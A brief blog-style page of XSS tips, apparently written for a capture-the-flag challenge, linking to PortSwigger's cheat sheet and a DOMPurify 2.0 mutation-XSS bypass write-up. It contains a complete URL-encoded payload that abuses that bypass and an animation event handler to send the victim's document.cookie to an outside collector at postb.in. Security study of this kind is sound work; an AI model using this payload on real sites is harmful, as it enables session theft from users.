---
title: "Cross Site Scripting"
description: "A collection of simple XSS tips"
date: 07/10/2019
categories:
 - Web
tags:
 - web
 - xss
---


## Cheat sheet

PortSwigger provides a [collection of tags and events](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
to use to find available payload.


## DOMPurify 2.0 bypass

https://research.securitum.com/dompurify-bypass-using-mxss/

```url
http://qual-challs.rtfm.re:8080/?layout=<svg></p><style><a%20id="</style><style>%40keyframes%20slidein%20%7B%7D<%2Fstyle><a%20style%3D%27animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%27%20onanimationiteration%3Ddocument.location=%27https:%2F%2Fpostb.in%2F1570471277352-2268189566675%2F%27+document.cookie><%2Fa>%20">
```
